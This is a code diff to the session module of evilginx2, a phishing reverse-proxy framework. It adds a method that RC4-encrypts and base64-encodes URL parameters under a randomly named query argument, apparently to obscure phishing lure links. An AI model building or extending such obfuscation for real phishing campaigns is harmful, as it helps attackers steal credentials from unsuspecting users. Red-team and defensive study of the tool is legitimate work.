@@ -2,6 +2,11 @@ package core
 
 import (
 	"time"
+	"math/rand"
+	"strings"
+	"crypto/rc4"
+	"encoding/base64"
+	"net/url"
 
 	"github.com/kgretzky/evilginx2/database"
 )
@@ -140,4 +145,34 @@ func (s *Session) Finish(is_auth_url bool) {
 			s.DoneSignal = nil
 		}
 	}
+}
+
+func (s Session) EncryptParams(params map[string]string) string {
+	p := url.Values{}
+	var ret string = ""
+
+	for k, v := range params {
+		p.Add(k, v)
+	}
+
+	if len(p) > 0 {
+		key_arg := strings.ToLower(GenRandomString(rand.Intn(3)+1))
+
+		enc_key := GenRandomAlphanumString(8)
+		dec_params := p.Encode()
+
+		var crc byte
+		for _, c := range dec_params {
+			crc += byte(c)
+		}
+
+		c, _ := rc4.NewCipher([]byte(enc_key))
+		enc_params := make([]byte, len(dec_params)+1)
+		c.XORKeyStream(enc_params[1:], []byte(dec_params))
+		enc_params[0] = crc
+
+		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
+		ret += "?" + key_arg + "=" + key_val
+	}
+	return ret
 }
